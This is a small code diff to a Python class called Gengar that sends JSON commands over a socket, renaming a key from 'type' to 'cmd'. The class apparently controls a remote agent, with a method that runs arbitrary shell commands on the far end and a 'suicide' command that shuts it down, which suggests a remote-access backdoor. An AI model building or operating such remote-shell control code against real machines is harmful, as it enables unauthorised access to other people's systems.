@@ -12,12 +12,12 @@ class Gengar:
         return self._sock.recv(buff_size).decode().strip()
 
     def shell(self, cmd):
-        payload = json.dumps(dict(type='shell', content=cmd))
+        payload = json.dumps(dict(cmd='shell', content=cmd))
         self._send(payload)
         return self._recv(4096)
 
     def suicide(self):
-        payload = json.dumps(dict(type='suicide'))
+        payload = json.dumps(dict(cmd='suicide'))
         self._send(payload)
         self._sock.close()
 
